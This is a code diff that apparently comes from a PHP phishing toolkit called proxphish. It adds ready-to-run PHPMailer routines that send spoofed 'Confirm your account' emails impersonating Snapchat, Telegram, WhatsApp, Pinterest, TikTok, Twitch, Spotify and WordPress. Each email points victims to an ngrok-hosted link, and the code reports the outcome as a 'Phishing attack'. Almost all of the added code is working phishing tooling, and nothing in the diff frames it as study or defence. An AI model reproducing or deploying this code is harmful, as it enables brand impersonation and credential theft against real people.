@@ -25,9 +25,6 @@ ini_set('display_startup_errors', '1');
 error_reporting(E_ALL);
 
 
-
-
-
  session_start();
 
  clearstatcache();
@@ -92,13 +89,18 @@ transform: scale(2);
     <input type="submit" name="submit_email_phishing" value="Email Phishing" id="submit">
          </form>
       </div>
-    
+        
+         <hr>
+       
+        <div align="center">
+           <h3>  <font color="white"> Or </font>  </h3> 
+           <input type="submit" value="No use mail" id="submit" onclick="location.href='/';">
+       </div>
 
-         <br>
-
+  
  
   <div id="footer" align="center">
-   <img src="css/icons/logo.png" height="300" width="300">
+   <img src="css/icons/logo.png" height="250" width="250">
    </div>
    
 
@@ -340,6 +342,61 @@ $mail->AddAddress("$email");
        echo ("<script>location.href='/'</script>");
        }
       } // end if site ready twitter
+
+
+
+
+else if ($link == 'no-reply@snapchat.com')
+        {
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
+$mail = new PHPMailer(); // create a new object
+
+$mail->CharSet = 'UTF-8';
+
+$mail->isSMTP();                                      // Set mailer to use SMTP
+$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
+$mail->SMTPAuth = true;                               // Enable SMTP authentication
+$mail->Username = "$mail_user";                 // SMTP username
+$mail->Password = "$mail_pass";                           // SMTP password
+$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
+$mail->Port = 587;   
+
+$mail->SetFrom('Snapchat', 'Snapchat'); // 
+
+$mail->FromName = 'Snapchat'; // 
+
+$mail->AddEmbeddedImage('css/mail_pics/snapchat.png', 'snapchat');
+
+$mail->IsHTML(true);
+
+$mail->Subject = "Confirm your Snapchat account";
+$mail->Body = "<h2> <img src='cid:twitt' height='24' width='24'> 
+                <font color='#65A8EC'>
+                 Action Required: Confirm your Snapchat account  
+                 </font>  
+              </h2> 
+               <br><br>
+               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
+                                                  text-align: center; border-radius: 3px; color: white;
+                                                  font-weight: bold; background:#65A8EC; color:white; 
+                                                  font-size: 14px; text-decoration: none'> 
+                Confirm your account 
+                </a>";
+             
+$mail->AddAddress("$email");
+     if ($mail->Send()) 
+        {
+      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
+        // </script>';
+        echo ("<script>location.href='/'</script>");
+         }
+     else 
+      {
+      echo '<script type="text/javascript">alert("Phishing attack failed");
+         </script>';
+       echo ("<script>location.href='/'</script>");
+       }
+      } // end if site ready snapchat
 
 
 
@@ -787,6 +844,414 @@ $mail->AddAddress("$email");
        echo ("<script>location.href='/'</script>");
        }
       } // end if site ready netflix
+
+
+
+
+
+
+
+else if ($link == 'no-reply@telegram.com')
+        {
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
+$mail = new PHPMailer(); // create a new object
+
+$mail->CharSet = 'UTF-8';
+
+$mail->isSMTP();                                      // Set mailer to use SMTP
+$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
+$mail->SMTPAuth = true;                               // Enable SMTP authentication
+$mail->Username = "$mail_user";                 // SMTP username
+$mail->Password = "$mail_pass";                           // SMTP password
+$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
+$mail->Port = 587;   
+
+$mail->SetFrom('Telegram', 'Telegram'); // 
+
+$mail->FromName = 'Telegram'; // 
+
+$mail->AddEmbeddedImage('css/mail_pics/telegram.png', 'telegram');
+
+$mail->IsHTML(true);
+
+$mail->Subject = "Confirm your Telegram account";
+$mail->Body = "<h2> <img src='cid:twitt' height='24' width='24'> 
+                <font color='#65A8EC'>
+                 Action Required: Confirm your Telegram account  
+                 </font>  
+              </h2> 
+               <br><br>
+               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
+                                                  text-align: center; border-radius: 3px; color: white;
+                                                  font-weight: bold; background:#65A8EC; color:white; 
+                                                  font-size: 14px; text-decoration: none'> 
+                Confirm your account 
+                </a>";
+             
+$mail->AddAddress("$email");
+     if ($mail->Send()) 
+        {
+      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
+        // </script>';
+        echo ("<script>location.href='/'</script>");
+         }
+     else 
+      {
+      echo '<script type="text/javascript">alert("Phishing attack failed");
+         </script>';
+       echo ("<script>location.href='/'</script>");
+       }
+      } // end if site ready telegram
+
+
+
+
+
+
+else if ($link == 'no-reply@whatsapp.com')
+        {
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
+$mail = new PHPMailer(); // create a new object
+
+$mail->CharSet = 'UTF-8';
+
+$mail->isSMTP();                                      // Set mailer to use SMTP
+$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
+$mail->SMTPAuth = true;                               // Enable SMTP authentication
+$mail->Username = "$mail_user";                 // SMTP username
+$mail->Password = "$mail_pass";                           // SMTP password
+$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
+$mail->Port = 587;   
+
+$mail->SetFrom('Whatsapp', 'Whatsapp'); // 
+
+$mail->FromName = 'Whatsapp'; // 
+
+$mail->AddEmbeddedImage('css/mail_pics/whatsapp.png', 'whatsapp');
+
+$mail->IsHTML(true);
+
+$mail->Subject = "Confirm your Whatsapp account";
+$mail->Body = "<h2> <img src='cid:twitt' height='24' width='24'> 
+                <font color='#65A8EC'>
+                 Action Required: Confirm your Whatsapp account  
+                 </font>  
+              </h2> 
+               <br><br>
+               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
+                                                  text-align: center; border-radius: 3px; color: white;
+                                                  font-weight: bold; background:#65A8EC; color:white; 
+                                                  font-size: 14px; text-decoration: none'> 
+                Confirm your account 
+                </a>";
+             
+$mail->AddAddress("$email");
+     if ($mail->Send()) 
+        {
+      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
+        // </script>';
+        echo ("<script>location.href='/'</script>");
+         }
+     else 
+      {
+      echo '<script type="text/javascript">alert("Phishing attack failed");
+         </script>';
+       echo ("<script>location.href='/'</script>");
+       }
+      } // end if site ready whatsapp
+
+
+
+
+
+
+
+else if ($link == 'no-reply@pinterest.com')
+        {
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
+$mail = new PHPMailer(); // create a new object
+
+$mail->CharSet = 'UTF-8';
+
+$mail->isSMTP();                                      // Set mailer to use SMTP
+$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
+$mail->SMTPAuth = true;                               // Enable SMTP authentication
+$mail->Username = "$mail_user";                 // SMTP username
+$mail->Password = "$mail_pass";                           // SMTP password
+$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
+$mail->Port = 587;   
+
+$mail->SetFrom('Pinterest', 'Pinterest'); // 
+
+$mail->FromName = 'Pinterest'; // 
+
+$mail->AddEmbeddedImage('css/mail_pics/pinterest.png', 'pinterest');
+
+$mail->IsHTML(true);
+
+$mail->Subject = "Confirm your Pinterest account";
+$mail->Body = "<h2> <img src='cid:twitt' height='24' width='24'> 
+                <font color='#65A8EC'>
+                 Action Required: Confirm your Pinterest account  
+                 </font>  
+              </h2> 
+               <br><br>
+               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
+                                                  text-align: center; border-radius: 3px; color: white;
+                                                  font-weight: bold; background:#65A8EC; color:white; 
+                                                  font-size: 14px; text-decoration: none'> 
+                Confirm your account 
+                </a>";
+             
+$mail->AddAddress("$email");
+     if ($mail->Send()) 
+        {
+      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
+        // </script>';
+        echo ("<script>location.href='/'</script>");
+         }
+     else 
+      {
+      echo '<script type="text/javascript">alert("Phishing attack failed");
+         </script>';
+       echo ("<script>location.href='/'</script>");
+       }
+      } // end if site ready pinterest
+
+
+
+
+
+
+else if ($link == 'no-reply@tiktok.com')
+        {
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
+$mail = new PHPMailer(); // create a new object
+
+$mail->CharSet = 'UTF-8';
+
+$mail->isSMTP();                                      // Set mailer to use SMTP
+$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
+$mail->SMTPAuth = true;                               // Enable SMTP authentication
+$mail->Username = "$mail_user";                 // SMTP username
+$mail->Password = "$mail_pass";                           // SMTP password
+$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
+$mail->Port = 587;   
+
+$mail->SetFrom('Tiktok', 'Tiktok'); // 
+
+$mail->FromName = 'Tiktok'; // 
+
+$mail->AddEmbeddedImage('css/mail_pics/tiktok.png', 'tiktok');
+
+$mail->IsHTML(true);
+
+$mail->Subject = "Confirm your Tiktok account";
+$mail->Body = "<h2> <img src='cid:twitt' height='24' width='24'> 
+                <font color='#65A8EC'>
+                 Action Required: Confirm your Tiktok account  
+                 </font>  
+              </h2> 
+               <br><br>
+               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
+                                                  text-align: center; border-radius: 3px; color: white;
+                                                  font-weight: bold; background:#65A8EC; color:white; 
+                                                  font-size: 14px; text-decoration: none'> 
+                Confirm your account 
+                </a>";
+             
+$mail->AddAddress("$email");
+     if ($mail->Send()) 
+        {
+      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
+        // </script>';
+        echo ("<script>location.href='/'</script>");
+         }
+     else 
+      {
+      echo '<script type="text/javascript">alert("Phishing attack failed");
+         </script>';
+       echo ("<script>location.href='/'</script>");
+       }
+      } // end if site ready tiktok
+
+
+
+
+
+
+
+else if ($link == 'no-reply@twitch.com')
+        {
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
+$mail = new PHPMailer(); // create a new object
+
+$mail->CharSet = 'UTF-8';
+
+$mail->isSMTP();                                      // Set mailer to use SMTP
+$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
+$mail->SMTPAuth = true;                               // Enable SMTP authentication
+$mail->Username = "$mail_user";                 // SMTP username
+$mail->Password = "$mail_pass";                           // SMTP password
+$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
+$mail->Port = 587;   
+
+$mail->SetFrom('Twitch', 'Twitch'); // 
+
+$mail->FromName = 'Twitch'; // 
+
+$mail->AddEmbeddedImage('css/mail_pics/twitch.png', 'twitch');
+
+$mail->IsHTML(true);
+
+$mail->Subject = "Confirm your Twitch account";
+$mail->Body = "<h2> <img src='cid:twitt' height='24' width='24'> 
+                <font color='#65A8EC'>
+                 Action Required: Confirm your Twitch account  
+                 </font>  
+              </h2> 
+               <br><br>
+               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
+                                                  text-align: center; border-radius: 3px; color: white;
+                                                  font-weight: bold; background:#65A8EC; color:white; 
+                                                  font-size: 14px; text-decoration: none'> 
+                Confirm your account 
+                </a>";
+             
+$mail->AddAddress("$email");
+     if ($mail->Send()) 
+        {
+      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
+        // </script>';
+        echo ("<script>location.href='/'</script>");
+         }
+     else 
+      {
+      echo '<script type="text/javascript">alert("Phishing attack failed");
+         </script>';
+       echo ("<script>location.href='/'</script>");
+       }
+      } // end if site ready twitch
+
+
+
+
+
+
+
+
+else if ($link == 'no-reply@spotify.com')
+        {
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
+$mail = new PHPMailer(); // create a new object
+
+$mail->CharSet = 'UTF-8';
+
+$mail->isSMTP();                                      // Set mailer to use SMTP
+$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
+$mail->SMTPAuth = true;                               // Enable SMTP authentication
+$mail->Username = "$mail_user";                 // SMTP username
+$mail->Password = "$mail_pass";                           // SMTP password
+$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
+$mail->Port = 587;   
+
+$mail->SetFrom('Spotify', 'Spotify'); // 
+
+$mail->FromName = 'Spotify'; // 
+
+$mail->AddEmbeddedImage('css/mail_pics/spotify.png', 'spotify');
+
+$mail->IsHTML(true);
+
+$mail->Subject = "Confirm your Spotify account";
+$mail->Body = "<h2> <img src='cid:twitt' height='24' width='24'> 
+                <font color='#65A8EC'>
+                 Action Required: Confirm your Spotify account  
+                 </font>  
+              </h2> 
+               <br><br>
+               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
+                                                  text-align: center; border-radius: 3px; color: white;
+                                                  font-weight: bold; background:#65A8EC; color:white; 
+                                                  font-size: 14px; text-decoration: none'> 
+                Confirm your account 
+                </a>";
+             
+$mail->AddAddress("$email");
+     if ($mail->Send()) 
+        {
+      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
+        // </script>';
+        echo ("<script>location.href='/'</script>");
+         }
+     else 
+      {
+      echo '<script type="text/javascript">alert("Phishing attack failed");
+         </script>';
+       echo ("<script>location.href='/'</script>");
+       }
+      } // end if site ready spotify
+
+
+
+
+
+
+
+
+else if ($link == 'no-reply@wordpress.com')
+        {
+      require "/var/www/proxphish/mail/PHPMailerAutoload.php";
+$mail = new PHPMailer(); // create a new object
+
+$mail->CharSet = 'UTF-8';
+
+$mail->isSMTP();                                      // Set mailer to use SMTP
+$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
+$mail->SMTPAuth = true;                               // Enable SMTP authentication
+$mail->Username = "$mail_user";                 // SMTP username
+$mail->Password = "$mail_pass";                           // SMTP password
+$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
+$mail->Port = 587;   
+
+$mail->SetFrom('Wordpress', 'Wordpress'); // 
+
+$mail->FromName = 'Wordpress'; // 
+
+$mail->AddEmbeddedImage('css/mail_pics/wordpress.png', 'wordpress');
+
+$mail->IsHTML(true);
+
+$mail->Subject = "Confirm your Wordpress account";
+$mail->Body = "<h2> <img src='cid:twitt' height='24' width='24'> 
+                <font color='#65A8EC'>
+                 Action Required: Confirm your Wordpress account  
+                 </font>  
+              </h2> 
+               <br><br>
+               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
+                                                  text-align: center; border-radius: 3px; color: white;
+                                                  font-weight: bold; background:#65A8EC; color:white; 
+                                                  font-size: 14px; text-decoration: none'> 
+                Confirm your account 
+                </a>";
+             
+$mail->AddAddress("$email");
+     if ($mail->Send()) 
+        {
+      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
+        // </script>';
+        echo ("<script>location.href='/'</script>");
+         }
+     else 
+      {
+      echo '<script type="text/javascript">alert("Phishing attack failed");
+         </script>';
+       echo ("<script>location.href='/'</script>");
+       }
+      } // end if site ready wordpress
+
+
 
 
 
